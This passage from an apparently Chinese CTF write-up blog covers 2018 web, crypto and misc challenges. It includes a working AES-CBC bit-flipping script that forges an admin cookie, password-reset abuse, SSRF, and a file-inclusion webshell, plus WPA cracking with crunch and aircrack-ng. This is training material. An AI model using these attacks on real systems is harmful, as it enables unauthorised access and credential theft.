href="http://quincyblog.top/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="external">http://quincyblog.top/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/#more</a></p><h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>查看源码得提示index.txt，访问得到源码 </p><pre><code class="php">&lt;?phpinclude &#39;sqlwaf.php&#39;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){    $iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}// 使用aes-128-cbc 模式加密function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));// cookie[iv] = 随机生成的iv 的base64    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie[cipher] = 加密值的base64}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){//发现当账号为admin，才会显示flag，        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is *************&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;    die();}// 解密cipherfunction check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);//cipher和iv变量均中cookie数组中取        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }else{            die(&quot;ERROR!&quot;);        }    }}if (isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])) {  $username=waf((string)$_POST[&#39;username&#39;]);  $password=waf((string)$_POST[&#39;password&#39;]);  if($username === &#39;admin&#39;){        exit(&#39;&lt;p&gt;You are not real admin!&lt;/p&gt;&#39;);//当我们以admin账号登录时，程序会直接跳出    }else{        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&#39;username&#39; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&#39;password&#39; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>思路就是构造一个Admin用户，然后将大写的A翻转成小写的a，即是admin。我们点击登录之后，可以在cookie中获取到iv和cipher的值（看14行的login函数），然后我们先将cipher的第9个字符使用异或运算翻转成小写字母a，因为info数组序列化后，我们要翻转的大写字母A在下标为9的位置，每个分组的长度为16，因为返回的iv变量长度为16（要先经过base64解密）</p><ol><li>​              s:2:{s:8:”userna</li><li>​              me”;s:5:”Admin”;</li><li>​              s:8:”password”;s</li><li>​              :5:”admin”;}</li></ol><p>要第二组的b变为d 就要第一组的u改变 </p><p>python脚本：</p><pre><code class="python">import urllib,base64,requests,reurl = &quot;http://118.190.152.202:8001/index.php&quot;datas = {    &quot;username&quot; : &quot;Admin&quot;,    &quot;password&quot; : &quot;admin&quot;}r = requests.post(url,data=datas)cipher = r.cookies.get(&quot;cipher&quot;)cipher = base64.b64decode(urllib.unquote(cipher))offset = 9new_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]new_cookies = requests.utils.dict_from_cookiejar(r.cookies)new_cookies[&quot;cipher&quot;] = urllib.quote_plus(base64.b64encode(new_cipher))r2 = requests.get(url,cookies=new_cookies)plain = base64.b64decode(re.findall(&quot;decode\(&#39;(.*)&#39;\)&quot;,r2.text)[0])iv = base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))old = plain[:len(iv)]new = &#39;a:2:{s:8:&quot;userna&#39;new_iv = &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])new_cookies[&quot;iv&quot;] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=new_cookies)print(r3.text)</code></pre><p>看其他师傅的其他解题：</p><p><a href="https://mp.weixin.qq.com/s?srcid=0525HLtDRNGV7DM8TsC469W2&amp;scene=23&amp;mid=2247484248&amp;sn=05c6b69fc6bd49b0ff8d1b9b8842d0fb&amp;idx=1&amp;__biz=MzUxOTYzMzU0NQ%3D%3D&amp;chksm=f9f7ecbece8065a88c1bf77efbc67106aacfc93942e72198a26efca026788ddfc75be75030d2&amp;mpshare=1#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?srcid=0525HLtDRNGV7DM8TsC469W2&amp;scene=23&amp;mid=2247484248&amp;sn=05c6b69fc6bd49b0ff8d1b9b8842d0fb&amp;idx=1&amp;__biz=MzUxOTYzMzU0NQ%3D%3D&amp;chksm=f9f7ecbece8065a88c1bf77efbc67106aacfc93942e72198a26efca026788ddfc75be75030d2&amp;mpshare=1#rd</a>  </p><p><a href="https://www.anquanke.com/post/id/146063" target="_blank" rel="external">https://www.anquanke.com/post/id/146063</a></p><p><a href="https://blog.zilch40.wang/2018/05/25/iscc-2018-writeup/#Collide-250" target="_blank" rel="external">https://blog.zilch40.wang/2018/05/25/iscc-2018-writeup/#Collide-250</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h2&gt;&lt;h3 id=&quot;What-is-that？&quot;&gt;&lt;a href=&quot;#What-is-that？&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>全国网络空间安全技术大赛2018三道wp</title>
    <link href="http://0xmj.club/2018/05/15/%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B2018%E4%B8%89%E9%81%93wp/"/>
    <id>http://0xmj.club/2018/05/15/全国网络空间安全技术大赛2018三道wp/</id>
    <published>2018-05-15T11:04:17.000Z</published>
    <updated>2018-05-15T11:04:45.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="全国网络空间安全技术大赛2018三道wp"><a href="#全国网络空间安全技术大赛2018三道wp" class="headerlink" title="全国网络空间安全技术大赛2018三道wp"></a>全国网络空间安全技术大赛2018三道wp</h1><h2 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h2><p>得到一张图片</p><p>binwalk 发现是zip加密</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805121134_772.png" alt=""></p><p>直接修改后缀.zip</p><p>打开压缩包之后发现需要解压密码</p><p>猜测是伪加密那就直接尝试伪加密，利用伪加密判断工具ZipCenOp</p><pre><code>java -jar ZipCenOp.jar r xxx.zip</code></pre><p>得到一个txt</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805121128_864.png" alt=""></p><p>一开始以为是base64解码 把除了最后一行的==删除 去解码发现是乱码，知道思路不对 ，后来想起xdctf出过一到base64隐写</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805121124_544.png" alt=""></p><p>编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因，这样就需要一张映射表，如下：</p><p><img src="https://img0.tuicool.com/jiIR3yZ.png!web" alt="img"></p><p>举个例子(base64)：</p><p>源文本：T h e</p><p>对应ascii码:84 104 101</p><p>8位binary：01010100 01101000 01100101</p><p>6位binary：010101 000110 100001 100101</p><p>高位补0：000010101 00000110 00100001 00100101</p><p>对应ascii码：21 6 33 37</p><p>查表：V G h l</p><h4 id="隐写原理"><a href="#隐写原理" class="headerlink" title="隐写原理"></a>隐写原理</h4><p>A对应的二进制位为01000001，补全之后为01000001    0000，对应的base64的编码为QQ（010000     010000），所以之后有两个‘=’。在解码的时候我就要在去掉=对应的6个零的同时在去掉4个0，也就是解码的时候会解析01000001而不是010000010000。这时候我们会发现了，我们去掉的这四个0是不是可以用来隐藏信息？？？反正解码的时候会被裁剪掉，那我干脆就在后面做一些手脚，用base64来混淆视听。 </p><pre><code class="python">#!/usr/bin/python#coding:utf-8b64chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;with open(&#39;stego.txt&#39;, &#39;rb&#39;) as f:    bin_str = &#39;&#39;    for line in f.readlines():        stegb64 = &#39;&#39;.join(line.split())        rowb64 =  &#39;&#39;.join(stegb64.decode(&#39;base64&#39;).encode(&#39;base64&#39;).split())        offset = abs(b64chars.index(stegb64.replace(&#39;=&#39;,&#39;&#39;)[-1])-b64chars.index(rowb64.replace(&#39;=&#39;,&#39;&#39;)[-1]))        equalnum = stegb64.count(&#39;=&#39;) #no equalnum no offset        if equalnum:            bin_str += bin(offset)[2:].zfill(equalnum * 2)        print &#39;&#39;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) #8位一组</code></pre><p>可以看这个师傅写的：<a href="https://www.tr0y.wang/2017/06/14/Base64steg/" target="_blank" rel="external">https://www.tr0y.wang/2017/06/14/Base64steg/</a></p><p><a href="https://github.com/amor-tsai/php_screw.git" target="_blank" rel="external">https://github.com/amor-tsai/php_screw.git</a></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开一个登陆界面 ，</p><p>先注册，进入 右上角有个修改密码 猜测是任意密码重置</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131624_405.png" alt=""></p><p>提示flag在flag.php里</p><p>抓包发现自己的Mang0被base64加密 然后url编码</p><p>所以想到username更改admin尝试密码重置逻辑问题。</p><p>username=YWRtaW4%3D</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130011_460.png" alt=""></p><p>发现密码重置成功，进入登陆界面 登陆成功</p><p>发现页面叫我们填写远程图片地址，一开始尝试上传木马地址，然后上传木马图片但是都没有用处，问题在哪里呢</p><p>思考发现会不会ssrf漏洞， 让服务器自己伪造请求，</p><p>后将地址改成本地的flag.php</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130048_442.png" alt=""></p><p>得到 两个图片地址第二个图片是我们上传的，但是被解析就是jgp,</p><p>无法利用所以利用点在于第一幅图片。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130049_141.png" alt=""></p><p>访问第一幅图片地址，下载下来 得到flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130049_976.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130050_718.png" alt=""></p><p>保存图片得到flag</p><h2 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h2><p>git源码泄露，</p><p>githack工具下载源码审计</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131640_57.png" alt=""></p><p>upload很奇怪</p><p>进入查看，谷歌查询<a href="http://0day5.com/archives/4022/" target="_blank" rel="external">http://0day5.com/archives/4022/</a></p><p>存在免认证登录漏洞</p><p>访问<a href="http://117.34.116.192/upload.php" target="_blank" rel="external">http://117.34.116.192/upload.php</a></p><p>burp抓包改cookie</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131648_158.png" alt=""></p><p>进入</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131650_741.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131650_29.png" alt=""></p><p>上传文件包含</p><p><a href="http://117.34.116.192/index.php?file=./img/img26019845.jpg" target="_blank" rel="external">http://117.34.116.192/index.php?file=./img/img26019845.jpg</a></p><p>index.php 会把这jpg解析成php运行</p><p>菜刀连接得到fl4g.php</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131810_848.png" alt=""></p><p>需要php反编译，得到原始代码</p><p>flag{7cb3d823105433606ccac8fb75aed67c}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;全国网络空间安全技术大赛2018三道wp&quot;&gt;&lt;a href=&quot;#全国网络空间安全技术大赛2018三道wp&quot; class=&quot;headerlink&quot; title=&quot;全国网络空间安全技术大赛2018三道wp&quot;&gt;&lt;/a&gt;全国网络空间安全技术大赛2018三道wp&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>bugku-misc</title>
    <link href="http://0xmj.club/2018/05/01/bugku-misc/"/>
    <id>http://0xmj.club/2018/05/01/bugku-misc/</id>
    <published>2018-05-01T11:02:14.000Z</published>
    <updated>2018-05-15T11:03:01.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bugku-misc"><a href="#bugku-misc" class="headerlink" title="bugku misc"></a>bugku misc</h1><p>做了iscc2018发现自己misc能力差很多，也忘了很多，这周做了bugku misc，总结一下。</p><h3 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h3><p>直接文本编辑器打开；文本末尾发现了一行转义序列： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281525_944.png" alt=""></p><blockquote><p>Unicode编码有以下四种编码方式：</p><p>源文本： <code>The</code></p><p>&amp;#x [Hex]： <code>&amp;#x0054;&amp;#x0068;&amp;#x0065;</code></p><p>&amp;# [Decimal]： <code>&amp;#00084;&amp;#00104;&amp;#00101;</code></p><p>\U [Hex]： <code>\U0054\U0068\U0065</code></p><p>\U+ [Hex]： <code>\U+0054\U+0068\U+0065</code></p></blockquote><p>unicode——&gt;acsii</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281343_354.png" alt=""></p><p>key{you are right}</p><h3 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h3><p>先来了解一下png的头文件。</p><p><code>89 50 4E 47 0D 0A 1A 0A</code> ——&gt;PNG头部署名域，表示这是一个PNG图片</p><p><code>00 00 00 0D</code> ——-&gt;描述IHDR头部的大小</p><p><code>49 48 44 52</code> ——&gt;是Chunk Type Code, 这里Chunk Type Code=IHDR</p><p><code>F9 7D AA 93</code> ——&gt;对IHDR的CRC校验</p><p><code>00 00 01 F4</code> ——&gt;图像宽度，500像素</p><p><code>00 00 01 A4</code> ——&gt;图像高度。</p><p>png的标志就是IHDR</p><p><a href="https://blog.csdn.net/joqian/article/details/8290389" target="_blank" rel="external">https://blog.csdn.net/joqian/article/details/8290389</a></p><p>下载rar文件，打开得到一张图片。</p><p>我们把它放到kali中，用binwalk分析一下。  </p><p>发现只是一张图片而已。但这时候发现一个问题，这张图片并不能打开。 </p><p>winhex打开最后从图片格式入手，更改其高度得到flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281627_225.png" alt=""></p><p>将A4改为F4</p><p>BUGKU{a1e5aSA}</p><p>winhex的png原理：<a href="http://blog.csdn.net/bisword/article/details/2777121" target="_blank" rel="external">http://blog.csdn.net/bisword/article/details/2777121</a></p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>1.追踪TCP流</p><p>2.根据题目提示查看telnet协议，一个个找下去，在第41个数据包找到flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281647_239.png" alt=""></p><h3 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h3><p>WinHex 常见文件头</p><blockquote><p>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only]<br>(eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Postscript. (eps.or.ps)，文件头：252150532D41646F6265<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864</p></blockquote><p>改后缀为zip进行解压，得到一个word文档，但是打开是乱码</p><p>winhex打开</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281655_885.png" alt=""></p><p>所以是zip文件 从新将.doc 改成.zip</p><p>word文件夹里发现里面有个名为document的文件 ，在里面的document.xml发现flag </p><p>flag{F1@g}</p><h3 id="又一张图片，还单纯吗？？"><a href="#又一张图片，还单纯吗？？" class="headerlink" title="又一张图片，还单纯吗？？"></a>又一张图片，还单纯吗？？</h3><p>用binwalk检测发现还有一张图片把图片提取出来，就是flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804292329_656.png" alt=""></p><h3 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h3><p>下载图片通过百度对图片搜索功能<br>key{liuyifei}</p><h3 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h3><p>题目中给出一个conf.bin文件，主要是工具，用routerpassview打开，然后找到</p><p>（ <username val="053700357621">    <password val="210265">）题目中给出了提示，flag是宽带用户名。</password></username></p><p>flag{053700357621}</p><h3 id="隐写2-Welcome-jpg"><a href="#隐写2-Welcome-jpg" class="headerlink" title="隐写2 Welcome_.jpg"></a>隐写2 Welcome_.jpg</h3><p>从网站上下载下来就是一张图片，同过binwalk分析其中包含一个zip压缩包。</p><p>通过binwalk进行提取，会提取出三个文件，其中flag.rar与提示.jpg是CD24.zip压缩包的内容。</p><p>通过提示.jpg可以得到压缩包密码3位数，通过ARCHRP软件进行暴力破解获得密码为871.</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281801_848.png" alt=""></p><p>解压获得3.jpg</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281803_237.png" alt=""></p><p>通过写字板打开获得f1@g{eTB1IEFyZSBhIGhAY2tlciE=} </p><p>很明显eTB1IEFyZSBhIGhAY2tlciE=是Base64加密，通过解密获得y0u Are a h@cker!</p><p>即f1@g{y0u Are a h@cker!}，提交时需要将f1@g变换为flag，即最终为flag{y0u Are a h@cker!}</p><h3 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h3><p>sublime打开<img src="http://oy0tigw51.bkt.clouddn.com/201804300041_863.png" alt=""></p><p>复制谷歌搜索得到一张二维码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300040_509.png" alt=""></p><p>可以将图片和base64互相转换的网站<br><a href="http://www.vgot.net/test/image2base64.php" target="_blank" rel="external">http://www.vgot.net/test/image2base64.php</a></p><p>最后得到二维码 扫描即可KEY{dca57f966e4e4e31fd5b15417da63269}</p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>压缩包下载下来，解压，里面有一个flag文件，记事本打开，搜索flag没有，搜索key GET！</p><p>linux？ 不存在的…</p><pre><code>key{feb81d3834e2423c9903f4755464060b}</code></pre><p>方法二：</p><p>kali进行</p><p> tar -xvf 1.tar.gz </p><p>cat flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300111_333.png" alt=""></p><p>方法三：</p><p>放到linux里面strings打开，过滤一下KEY就找到了</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011620_101.png" alt=""></p><p>指令string flag | grep key</p><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>方法一：.pcapng又是数据包,wireshark打开，既然是用的菜刀，那就找http协议，第四个http包里找到了一句话木马： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300216_174.png" alt=""></p><p>flag应该在挂马之后才拿到，找到下一个http包，wireshark追踪一下http流： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300219_911.png" alt=""></p><p>可以知道菜刀创建了一个flag.tar.gz，还有echo了字符串<code>X@Y</code>，所以第三个包的response，出去前后两个字符串<code>X@Y</code>就是flag.tar.gz</p><p>然后把前后的“X@Y”删去，解码为压缩格式： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300215_384.png" alt=""></p><p>方法二：</p><p>用Wireshark打开分析 TCPstream</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300204_908.png" alt=""></p><p>在第九个数据包中看到了flag.tar.gz这个文件。</p><p>查看了一下其他数据包的内容，并没有关于传输这个文件的数据包信息。猜想这个文件可能被隐藏在caidao.pcapng里了。</p><p>放到binwalk分析，用dd命令把gzip文件提取出来。</p><blockquote><p>使用dd命令分离(linux/unix下)</p><p>dd命令分离出隐藏文件：</p><pre><code># dd if=carter.jpg of=output.jpg(自己定义的名字) skip=140147（对应的块偏移） bs=1</code></pre><p>-e选项可以用来执行自动数据提取的基础上提取规则中指定的默认的extract.conf文件：</p><pre><code>$ binwalk -e firmware.bin</code></pre></blockquote><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300156_242.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300157_912.png" alt=""></p><p>dd if=caidao.pcapng of=1.gzip skip=7747 bs=1</p><p>tar -xvf 1.gzip</p><p>cat flag/flag.txt </p><p>key{8769fe393f2b998fa6a11afe2bfcd65e}</p><h3 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h3><p>根据提示要找getshell流，wireshark打开CTF.pcagng</p><p>先大致浏览一下，不难发现从第104个包开始应该是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300237_928.png" alt="">追踪流——&gt;TCP可以看到其中有一个s4cr4t.txt的文件，base64解码得到flag</p><p>Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ==</p><blockquote><p>CCTF{do_you_like_sniffer}</p></blockquote><h3 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h3><p>当时的第一感觉就是大白怎么只有头没有身子，所以想到修改图片的宽和高。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300226_978.png" alt=""></p><p>更改02 A7</p><p>获得flag{He1l0_d4_ba1}</p><h3 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h3><p>这里用Java Decompiler 工具反编译。</p><p>分析以上代码可以得知，其中period是表示坚持的秒数，根据题目提示可以知道，需要坚持60秒，所以根据period/10找到case 6，得到flag的BASE64码flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}，解码得flag{DajiDali_JinwanChiji}。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300246_552.png" alt=""></p><h3 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h3><p>提示WIFI密码为手机号。下载下来是一个cap包，用wireshark打开。WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下——</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011539_973.png" alt=""></p><p>正好四个包，接下来就是破解密码了，因为已经给了11位手机号的前七位，使用crunch生成一个密码字典，然后进行破解</p><p> crunch 11 11 -t 1391040%%%% &gt;&gt;wifipassword.txt</p><p>学习crunch命令网站：<a href="http://netsecurity.51cto.com/art/201706/541638.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201706/541638.htm</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011546_958.png" alt=""></p><p>aircrack-ng wifi.cap -w wifipassword.txt</p><p>参数选择3 因为前两个为空</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011612_324.png" alt=""></p><p> KEY FOUND! [ 13910407686 ]</p><p>也可使用脚本写字典</p><pre><code class="c"># include&lt;stdio.h&gt;int main(){        int i,j,k,l;        FILE *fp=NULL;        fp=fopen(&quot;words.txt&quot;,&quot;w&quot;);        for(i=0;i&lt;=9;i++)    {                for(j=0;j&lt;=9;j++)        {                        for(k=0;k&lt;=9;k++)            {                                for(l=0;l&lt;=9;l++)                {                                        fprintf(fp,&quot;1391040%d%d%d%d\n&quot;,i,j,k,l);                                }                        }                }        }    fclose(fp);}</code></pre><pre><code class="python">s = &quot;1391040&quot;t = &quot;&quot;file = open(&#39;data.txt&#39;,&#39;w&#39;)for i in range(10):    for j in range(10):        for k in range(10):            for l in range(10):                t = s + str(i) + str(j) + str(k) + str(l)                file.write(t)                file.write(&#39;\n&#39;)file.close()</code></pre><h3 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h3><p>下载文件使用notepad++查看</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011716_149.png" alt=""></p><p>KEY{24f3627a86fc740a7f36ee2c7a1c124a}</p><p>方法二：strings brave | grep KEY</p><h3 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h3><p>把cookie修改为管理员,然后提示下载exe文件</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011722_15.png" alt=""></p><p>修改为true 得到下载地址，wireshark抓包随便填写账号密码抓包，筛选tcp流追踪一下</p><p>LOGIN下方是明显的BASE64编码，解码发现是一个163邮箱，取账+号密码，登陆后获取flag</p><p>flag{182100518+725593795416}</p><h3 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041929_134.png" alt=""></p><p>binwalk查看发现隐藏文件</p><p>foremost得到rar解压需要密码</p><p>右键查看照片属性</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041931_278.png" alt=""></p><p>base64解码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041933_188.png" alt=""></p><p>得到一个照片</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041935_321.png" alt=""></p><p>试一试修改高度</p><p>得到flag<img src="http://oy0tigw51.bkt.clouddn.com/201805041937_206.png" alt=""></p><p>BUGKU{a1e5aSA}</p><h3 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h3><p>binwalk分析隐藏压缩包，所以提取</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041939_484.png" alt="">得到zip文件</p><p>unzip 00000079.zip</p><p>得到8张文件和一个gif</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805051138_920.png" alt=""></p><p>追一分析</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805051140_411.png" alt=""></p><p>发现88、888、8888是被修改过的图片。</p><p>1.88图片自带二维码，扫描得到  bilibili</p><p>2.888将其后缀名添加上.jpg，查看其属性，从备注中获得一个使用base64加密的密文，解密得到silisili</p><p>3.8888有个压缩包，解压得到一张二维码得到panama</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805051144_91.png" alt=""></p><p>最后根据题目提示的进行组合，得到 